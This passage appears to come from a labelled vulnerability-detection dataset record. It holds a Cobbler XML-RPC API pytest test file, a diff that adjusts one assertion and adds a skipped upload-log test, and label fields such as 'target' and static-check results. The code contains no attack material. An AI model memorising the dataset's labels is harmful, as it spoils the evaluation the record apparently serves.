\"distro_items_paged_2\"\n        create_distro(name_distro_1, \"x86_64\", \"suse\", path_kernel, path_initrd)\n        create_distro(name_distro_2, \"x86_64\", \"suse\", path_kernel, path_initrd)\n\n        # Act\n        result = remote.find_items_paged(\"distro\", None, \"name\", 1, 1)\n\n        # Cleanup\n        remove_distro(name_distro_1)\n        remove_distro(name_distro_2)\n\n        # Assert\n        # Example output\n        # {'items': [{'ctime': 1589386486.9040322, 'depth': 0, 'mtime': 1589386486.9040322, 'source_repos': [],\n        # 'tree_build_time': 0, 'uid': 'cbf288465c724c439cf2ede6c94de4e8', 'arch': 'x86_64', 'autoinstall_meta': {},\n        # 'boot_files': {}, 'boot_loaders': '<<inherit>>', 'breed': 'suse', 'comment': '', 'fetchable_files': {},\n        # 'initrd': '/var/log/cobbler/cobbler.log', 'kernel': '/var/log/cobbler/cobbler.log', 'remote_boot_initrd': '~',\n        # 'remote_boot_kernel': '~', 'kernel_options': {}, 'kernel_options_post': {}, 'mgmt_classes': [],\n        # 'name': 'distro_items_paged_1', 'os_version': 'virtio26', 'owners': ['admin'], 'redhat_management_key': '',\n        # 'template_files': {}}], 'pageinfo': {'page': 1, 'prev_page': '~', 'next_page': 2, 'pages': [1, 2],\n        # 'num_pages': 2, 'num_items': 2, 'start_item': 0, 'end_item': 1, 'items_per_page': 1,\n        # 'items_per_page_list': [10, 20, 50, 100, 200, 500]}}\n        assert type(result) == dict\n        assert type(result.get(\"items\")) == list\n        assert \"pageinfo\" in result\n        assert \"pages\" in result[\"pageinfo\"]\n        assert result[\"pageinfo\"][\"pages\"] == [1, 2]\n\n    @pytest.mark.skip(\"This functionality was implemented very quickly. The test for this needs to be fixed at a \"\n                      \"later point!\")\n    def test_find_system_by_dns_name(self, remote, token, create_distro, remove_distro, create_profile, remove_profile,\n                                     create_system, remove_system, create_kernel_initrd):\n        # Arrange\n        fk_kernel = \"vmlinuz1\"\n        fk_initrd = \"initrd1.img\"\n        basepath = create_kernel_initrd(fk_kernel, fk_initrd)\n        path_kernel = os.path.join(basepath, fk_kernel)\n        path_initrd = os.path.join(basepath, fk_initrd)\n        name_distro = \"test_distro_template_for_system\"\n        name_profile = \"test_profile_template_for_system\"\n        name_system = \"test_system_template_for_system\"\n        dns_name = \"test.cobbler-test.local\"\n        create_distro(name_distro, \"x86_64\", \"suse\", path_kernel, path_initrd)\n        create_profile(name_profile, name_distro, \"text\")\n        system = create_system(name_system, name_profile)\n        remote.modify_system(system, \"dns_name\", dns_name, token)\n        remote.save_system(system, token)\n\n        # Act\n        result = remote.find_system_by_dns_name(dns_name)\n\n        # Cleanup\n        remove_system(name_system)\n        remove_profile(name_profile)\n        remove_distro(name_distro)\n\n        # Assert\n        assert result\n\n    def test_generate_script(self, remote, create_distro, remove_distro, create_profile, remove_profile,\n                             create_system, remove_system, create_kernel_initrd):\n        # Arrange\n        fk_kernel = \"vmlinuz1\"\n        fk_initrd = \"initrd1.img\"\n        basepath = create_kernel_initrd(fk_kernel, fk_initrd)\n        path_kernel = os.path.join(basepath, fk_kernel)\n        path_initrd = os.path.join(basepath, fk_initrd)\n        name_distro = \"test_distro_template_for_system\"\n        name_profile = \"test_profile_template_for_system\"\n        name_autoinstall_script = \"test_generate_script\"\n        create_distro(name_distro, \"x86_64\", \"suse\", path_kernel, path_initrd)\n        create_profile(name_profile, name_distro, \"text\")\n        # TODO: Create Autoinstall Script\n\n        # Act\n        result = remote.generate_script(name_profile, None, name_autoinstall_script)\n\n        # Cleanup\n        remove_profile(name_profile)\n        remove_distro(name_distro)\n\n        # Assert\n        assert result\n\n    def test_get_item_as_rendered(self, remote, token, create_distro, remove_distro, create_kernel_initrd):\n        # Arrange\n        fk_kernel = \"vmlinuz1\"\n        fk_initrd = \"initrd1.img\"\n        basepath = create_kernel_initrd(fk_kernel, fk_initrd)\n        path_kernel = os.path.join(basepath, fk_kernel)\n        path_initrd = os.path.join(basepath, fk_initrd)\n        name = \"test_item_as_rendered\"\n        create_distro(name, \"x86_64\", \"suse\", path_kernel, path_initrd)\n\n        # Act\n        result = remote.get_distro_as_rendered(name, token)\n\n        # Cleanup\n        remove_distro(name)\n\n        # Assert\n        assert result\n\n    def test_get_s_since(self, remote, create_distro, remove_distro, create_kernel_initrd):\n        # Arrange\n        fk_kernel = \"vmlinuz1\"\n        fk_initrd = \"initrd1.img\"\n        basepath = create_kernel_initrd(fk_kernel, fk_initrd)\n        path_kernel = os.path.join(basepath, fk_kernel)\n        path_initrd = os.path.join(basepath, fk_initrd)\n        name_distro_before = \"test_distro_since_before\"\n        name_distro_after = \"test_distro_since_after\"\n        create_distro(name_distro_before, \"x86_64\", \"suse\", path_kernel, path_initrd)\n        mtime = float(time.time())\n        create_distro(name_distro_after, \"x86_64\", \"suse\", path_kernel, path_initrd)\n\n        # Act\n        result = remote.get_distros_since(mtime)\n\n        # Cleanup\n        remove_distro(name_distro_before)\n        remove_distro(name_distro_after)\n\n        # Assert\n        assert isinstance(result, list)\n        assert len(result) == 1\n\n    def test_get_authn_module_name(self, remote, token):\n        # Arrange\n\n        # Act\n        result = remote.get_authn_module_name(token)\n\n        # Assert\n        assert result\n\n    def test_get_blended_data(self, remote, create_distro, remove_distro, create_profile, remove_profile,\n                              create_system, remove_system, create_kernel_initrd):\n        # Arrange\n        fk_kernel = \"vmlinuz1\"\n        fk_initrd = \"initrd1.img\"\n        basepath = create_kernel_initrd(fk_kernel, fk_initrd)\n        path_kernel = os.path.join(basepath, fk_kernel)\n        path_initrd = os.path.join(basepath, fk_initrd)\n        name_distro = \"test_distro_blended\"\n        name_profile = \"test_profile_blended\"\n        name_system = \"test_system_blended\"\n        create_distro(name_distro, \"x86_64\", \"suse\", path_kernel, path_initrd)\n        create_profile(name_profile, name_distro, \"text\")\n        create_system(name_system, name_profile)\n\n        # Act\n        result = remote.get_blended_data(name_profile, name_system)\n\n        # Cleanup\n        remove_system(name_system)\n        remove_profile(name_profile)\n        remove_distro(name_distro)\n\n        # Assert\n        assert result\n\n    def test_get_config_data(self, remote, token, create_distro, remove_distro, create_profile, remove_profile,\n                             create_system, remove_system, create_kernel_initrd):\n        # Arrange\n        fk_kernel = \"vmlinuz1\"\n        fk_initrd = \"initrd1.img\"\n        basepath = create_kernel_initrd(fk_kernel, fk_initrd)\n        path_kernel = os.path.join(basepath, fk_kernel)\n        path_initrd = os.path.join(basepath, fk_initrd)\n        name_distro = \"test_distro_template_for_system\"\n        name_profile = \"test_profile_template_for_system\"\n        name_system = \"test_system_template_for_system\"\n        system_hostname = \"testhostname\"\n        create_distro(name_distro, \"x86_64\", \"suse\", path_kernel, path_initrd)\n        create_profile(name_profile, name_distro, \"text\")\n        system = create_system(name_system, name_profile)\n        remote.modify_system(system, \"hostname\", system_hostname, token)\n        remote.save_system(system, token)\n\n        # Act\n        result = remote.get_config_data(system_hostname)\n\n        # Cleanup\n        remove_system(name_system)\n        remove_profile(name_profile)\n        remove_distro(name_distro)\n\n        # Assert\n        assert json.loads(result)\n\n    def test_get_repos_compatible_with_profile(self, remote, token, create_distro, remove_distro, create_profile,\n                                               remove_profile, create_repo, remove_repo, create_kernel_initrd):\n        # Arrange\n        fk_kernel = \"vmlinuz1\"\n        fk_initrd = \"initrd1.img\"\n        basepath = create_kernel_initrd(fk_kernel, fk_initrd)\n        path_kernel = os.path.join(basepath, fk_kernel)\n        path_initrd = os.path.join(basepath, fk_initrd)\n        name_distro = \"test_distro_get_repo_for_profile\"\n        name_profile = \"test_profile_get_repo_for_profile\"\n        name_repo_compatible = \"test_repo_compatible_profile_1\"\n        name_repo_incompatible = \"test_repo_compatible_profile_2\"\n        create_distro(name_distro, \"x86_64\", \"suse\", path_kernel, path_initrd)\n        create_profile(name_profile, name_distro, \"text\")\n        repo_compatible = create_repo(name_repo_compatible, \"http://localhost\", False)\n        repo_incompatible = create_repo(name_repo_incompatible, \"http://localhost\", False)\n        remote.modify_repo(repo_compatible, \"arch\", \"x86_64\", token)\n        remote.save_repo(repo_compatible, token)\n        remote.modify_repo(repo_incompatible, \"arch\", \"ppc64le\", token)\n        remote.save_repo(repo_incompatible, token)\n\n        # Act\n        result = remote.get_repos_compatible_with_profile(name_profile, token)\n\n        # Cleanup\n        remove_profile(name_profile)\n        remove_distro(name_distro)\n        remove_repo(name_repo_compatible)\n        remove_repo(name_repo_incompatible)\n\n        # Assert\n        assert result != []\n\n    def test_get_status(self, remote, token):\n        # Arrange\n\n        # Act\n        result = remote.get_status(\"normal\", token)\n\n        # Assert\n        assert result == {}\n\n    @pytest.mark.skip(\"The function under test appears to have a bug. For now we skip the test.\")\n    def test_get_template_file_for_profile(self, remote, create_distro, remove_distro, create_profile, remove_profile,\n                                           create_autoinstall_template, remove_autoinstall_template,\n                                           create_kernel_initrd):\n        # Arrange\n        fk_kernel = \"vmlinuz1\"\n        fk_initrd = \"initrd1.img\"\n        basepath = create_kernel_initrd(fk_kernel, fk_initrd)\n        path_kernel = os.path.join(basepath, fk_kernel)\n        path_initrd = os.path.join(basepath, fk_initrd)\n        name_distro = \"test_distro_template_for_profile\"\n        name_profile = \"test_profile_template_for_profile\"\n        name_template = \"test_template_for_profile\"\n        content_template = \"# Testtemplate\"\n        create_distro(name_distro, \"x86_64\", \"suse\", path_kernel, path_initrd)\n        create_profile(name_profile, name_distro, \"text\")\n        create_autoinstall_template(name_template, content_template)\n\n        # Act\n        # TODO: Fix test & functionality!\n        result = remote.get_template_file_for_profile(name_profile, name_template)\n\n        # Cleanup\n        remove_profile(name_profile)\n        remove_distro(name_distro)\n        remove_autoinstall_template(name_template)\n\n        # Assert\n        assert result == content_template\n\n    def test_get_template_file_for_system(self, remote, create_distro, remove_distro, create_profile, remove_profile,\n                                          create_system, remove_system, create_autoinstall_template,\n                                          remove_autoinstall_template, create_kernel_initrd):\n        # Arrange\n        fk_kernel = \"vmlinuz1\"\n        fk_initrd = \"initrd1.img\"\n        basepath = create_kernel_initrd(fk_kernel, fk_initrd)\n        path_kernel = os.path.join(basepath, fk_kernel)\n        path_initrd = os.path.join(basepath, fk_initrd)\n        name_distro = \"test_distro_template_for_system\"\n        name_profile = \"test_profile_template_for_system\"\n        name_system = \"test_system_template_for_system\"\n        name_template = \"test_template_for_system\"\n        content_template = \"# Testtemplate\"\n        create_distro(name_distro, \"x86_64\", \"suse\", path_kernel, path_initrd)\n        create_profile(name_profile, name_distro, \"text\")\n        create_system(name_system, name_profile)\n        create_autoinstall_template(name_template, content_template)\n\n        # Act\n        result = remote.get_template_file_for_system(name_system, name_template)\n\n        # Cleanup\n        remove_system(name_system)\n        remove_profile(name_profile)\n        remove_distro(name_distro)\n        remove_autoinstall_template(name_template)\n\n        # Assert\n        assert result\n\n    def test_is_autoinstall_in_use(self, remote, token, create_distro, remove_distro, create_profile, remove_profile,\n                                   create_kernel_initrd):\n        # Arrange\n        fk_kernel = \"vmlinuz1\"\n        fk_initrd = \"initrd1.img\"\n        basepath = create_kernel_initrd(fk_kernel, fk_initrd)\n        path_kernel = os.path.join(basepath, fk_kernel)\n        path_initrd = os.path.join(basepath, fk_initrd)\n        name_distro = \"test_distro_is_autoinstall_in_use\"\n        name_profile = \"test_profile_is_autoinstall_in_use\"\n        create_distro(name_distro, \"x86_64\", \"suse\", path_kernel, path_initrd)\n        create_profile(name_profile, name_distro, \"text\")\n\n        # Act\n        result = remote.is_autoinstall_in_use(name_profile, token)\n\n        # Cleanup\n        remove_profile(name_profile)\n        remove_distro(name_distro)\n\n        # Assert\n        assert not result\n\n    def test_logout(self, remote):\n        # Arrange\n        shared_secret = get_shared_secret()\n        newtoken = remote.login(\"\", shared_secret)\n\n        # Act\n        resultlogout = remote.logout(newtoken)\n        resulttokencheck = remote.token_check(newtoken)\n\n        # Assert\n        assert resultlogout\n        assert not resulttokencheck\n\n    def test_modify_setting(self, remote, token):\n        # Arrange\n\n        # Act\n        result = remote.modify_setting(\"auth_token_expiration\", 7200, token)\n\n        # Assert\n        assert result == 1\n\n    def test_read_autoinstall_template(self, remote, token, create_autoinstall_template, remove_autoinstall_template):\n        # Arrange\n        name = \"test_template_name\"\n        create_autoinstall_template(name, \"# Testtemplate\")\n\n        # Act\n        result = remote.read_autoinstall_template(name, token)\n\n        # Cleanup\n        remove_autoinstall_template(name)\n\n        # Assert\n        assert result\n\n    def test_write_autoinstall_template(self, remote, token, remove_autoinstall_template):\n        # Arrange\n        name = \"testtemplate\"\n\n        # Act\n        result = remote.write_autoinstall_template(name, \"# Testtemplate\", token)\n\n        # Cleanup\n        remove_autoinstall_template(name)\n\n        # Assert\n        assert result\n\n    def test_remove_autoinstall_template(self, remote, token, create_autoinstall_template):\n        # Arrange\n        name = \"test_template_remove\"\n        create_autoinstall_template(name, \"# Testtemplate\")\n\n        # Act\n        result = remote.remove_autoinstall_template(name, token)\n\n        # Assert\n        assert result\n\n    def test_read_autoinstall_snippet(self, remote, token, testsnippet, snippet_add, snippet_remove):\n        # Arrange\n        snippet_name = \"testsnippet_read\"\n        snippet_add(snippet_name, testsnippet)\n\n        # Act\n        result = remote.read_autoinstall_snippet(snippet_name, token)\n\n        # Assert\n        assert result == testsnippet\n\n        # Cleanup\n        snippet_remove(snippet_name)\n\n    def test_write_autoinstall_snippet(self, remote, token, testsnippet, snippet_remove):\n        # Arrange\n        # See fixture: testsnippet\n        name = \"testsnippet_write\"\n\n        # Act\n        result = remote.write_autoinstall_snippet(name, testsnippet, token)\n\n        # Assert\n        assert result\n\n        # Cleanup\n        snippet_remove(name)\n\n    def test_remove_autoinstall_snippet(self, remote, token, snippet_add, testsnippet):\n        # Arrange\n        name = \"testsnippet_remove\"\n        snippet_add(name, testsnippet)\n\n        # Act\n        result = remote.remove_autoinstall_snippet(name, token)\n\n        # Assert\n        assert result\n\n    def test_run_install_triggers(self, remote, token):\n        # Arrange\n        # TODO: Needs a system as a target\n\n        # Act\n        result_pre = remote.run_install_triggers(\"pre\", \"system\", \"systemname\", \"10.0.0.2\", token)\n        result_post = remote.run_install_triggers(\"post\", \"system\", \"systemname\", \"10.0.0.2\", token)\n\n        # Assert\n        assert result_pre\n        assert result_post\n\n    def test_version(self, remote):\n        # Arrange\n\n        # Act\n        result = remote.version()\n\n        # Assert\n        # Will fail if the version is adjusted in the setup.py\n        assert result == 3.3\n\n    def test_xapi_object_edit(self, remote, token, remove_distro, create_kernel_initrd):\n        # Arrange\n        fk_kernel = \"vmlinuz1\"\n        fk_initrd = \"initrd1.img\"\n        basepath = create_kernel_initrd(fk_kernel, fk_initrd)\n        path_kernel = os.path.join(basepath, fk_kernel)\n        path_initrd = os.path.join(basepath, fk_initrd)\n        name = \"testdistro_xapi_edit\"\n\n        # Act\n        result = remote.xapi_object_edit(\"distro\", name, \"add\",\n                                         {\"name\": name, \"arch\": \"x86_64\", \"breed\": \"suse\", \"kernel\": path_kernel,\n                                          \"initrd\": path_initrd}, token)\n\n        # Cleanup\n        remove_distro(name)\n\n        # Assert\n        assert result\n\n    @pytest.mark.usefixtures(\"create_testdistro\", \"create_testmenu\", \"create_profile\", \"remove_testdistro\",\n                             \"remove_testmenu\", \"remove_testprofile\")\n    def test_render_vars(self, remote, token):\n        \"\"\"\n        Test: string replacements for @@xyz@@\n        \"\"\"\n\n        # Arrange --> There is nothing to be arranged\n        kernel_options = \"tree=http://@@http_server@@/cblr/links/@@distro_name@@\"\n\n        # Act\n        distro = remote.get_item_handle(\"distro\", \"testdistro0\", token)\n        remote.modify_distro(distro, \"kernel_options\", kernel_options, token)\n        remote.save_distro(distro, token)\n\n        # Assert --> Let the test pass if the call is okay.\n        assert True\n\n    @pytest.mark.skip(\"Functionality is broken!\")\n    @pytest.mark.usefixtures(\"create_testdistro\", \"create_testmenu\", \"create_testprofile\", \"create_testsystem\",\n                             \"remove_testdistro\", \"remove_testmenu\", \"remove_testprofile\", \"remove_testsystem\")\n    def test_upload_log_data(self, remote):\n        # Arrange\n\n        # Act\n        result = remote.upload_log_data(\"testsystem0\", \"testinstall.log\", 0, 0, b\"asdas\")\n\n        # Assert\n        assert isinstance(result, bool)\n        assert result\n", "patch": "@@ -424,7 +424,7 @@ def test_modify_setting(self, remote, token):\n         result = remote.modify_setting(\"auth_token_expiration\", 7200, token)\n \n         # Assert\n-        assert result == 0\n+        assert result == 1\n \n     def test_read_autoinstall_template(self, remote, token, create_autoinstall_template, remove_autoinstall_template):\n         # Arrange\n@@ -562,3 +562,16 @@ def test_render_vars(self, remote, token):\n \n         # Assert --> Let the test pass if the call is okay.\n         assert True\n+\n+    @pytest.mark.skip(\"Functionality is broken!\")\n+    @pytest.mark.usefixtures(\"create_testdistro\", \"create_testmenu\", \"create_testprofile\", \"create_testsystem\",\n+                             \"remove_testdistro\", \"remove_testmenu\", \"remove_testprofile\", \"remove_testsystem\")\n+    def test_upload_log_data(self, remote):\n+        # Arrange\n+\n+        # Act\n+        result = remote.upload_log_data(\"testsystem0\", \"testinstall.log\", 0, 0, b\"asdas\")\n+\n+        # Assert\n+        assert isinstance(result, bool)\n+        assert result", "file_path": "files/2021_10/1113", "file_language": "py", "file_name": "tests/xmlrpcapi/miscellaneous_test.py", "outdated_file_modify": 0, "outdated_file_before": 0, "outdated_file_after": 0, "llm_check": 0, "static_check": 0, "static": {"rats": [false, []], "semgrep": [false, []]}, "target": 0, "function_before": [], "function_after": []}], "outdated": 0, "cwe_descripiton": "", "cwe_consequence": "", "cwe_method": "", "cwe_solution": ""}
